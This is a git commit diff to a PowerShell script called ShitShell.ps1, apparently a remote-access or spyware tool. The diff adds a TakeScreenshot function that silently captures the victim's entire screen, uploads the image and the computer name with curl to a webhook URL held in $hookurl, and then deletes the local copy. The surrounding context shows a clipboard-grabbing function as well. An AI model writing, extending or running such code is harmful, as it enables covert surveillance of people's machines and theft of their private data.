f6b82848bfed84d548b28a370ca85fd71c69d148
Neo0412 <94992865+Neo0412@users.noreply.github.com>
2024-03-02 14:13:27 +0100

    Update ShitShell.ps1

--- ShitShell.ps1
+++ ShitShell.ps1
@@ -1,4 +1,5 @@
 Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
 
 $hookUrl = "$hk"
 $bin = "$bn"
@@ -169,6 +170,26 @@ function GetClipboard {
 
     }
     
+}
+
+
+function TakeScreenshot {
+
+    $Filett = "$env:temp\SC.png"
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@$filett" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":clipboard:File_from_Clipboard:\"}"' $hookurl | Out-Null
+    Start-Sleep 1
+    Remove-Item -Path $filett
+ 
 }
 
 
